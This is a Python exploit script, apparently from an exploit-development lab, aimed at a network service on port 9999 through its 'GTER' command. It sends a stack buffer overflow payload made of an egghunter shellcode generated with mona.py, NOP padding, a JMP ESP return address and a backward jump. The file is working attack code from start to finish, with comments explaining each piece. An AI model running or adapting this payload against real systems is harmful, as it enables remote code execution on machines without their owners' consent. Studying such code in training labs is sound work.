#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Generated in with mona.py in Immunity Debugger: !mona egg -t w00t -wow64 -winver 10
EGGHUNTER =  b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
EGGHUNTER += b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
EGGHUNTER += b"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
EGGHUNTER += b"\xff\xe7"

PAYLOAD = (
    b'GTER /.:/' +
    b'\x90' * 10 +
    EGGHUNTER +
    b'\x90' * (135 - len(EGGHUNTER) - 10) + # We move the padding and make it NOP so our jump does not need to be precise.
    # jmp esp
    struct.pack('<L', 0x625026D3) +
    # JMP to the start of our buffer
    b'\xe9\x70\xff\xff\xff' +
    b'C' * (400 - 135 - 4 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
